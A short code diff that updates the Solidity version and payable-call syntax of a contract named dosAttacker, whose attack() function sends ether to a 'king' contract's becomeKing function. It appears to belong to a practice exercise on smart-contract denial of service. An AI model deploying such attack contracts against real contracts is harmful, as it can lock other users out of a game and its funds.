@@ -1,4 +1,4 @@
-pragma solidity ^0.5.2;
+pragma solidity ^0.7.0;
 
 import "./interfaces/Iking.sol";
 
@@ -10,6 +10,6 @@ contract dosAttacker {
     }
 
     function attack() public payable {
-        kingContract.becomeKing.value(msg.value)();
+        kingContract.becomeKing{value: msg.value}();
     }
 }
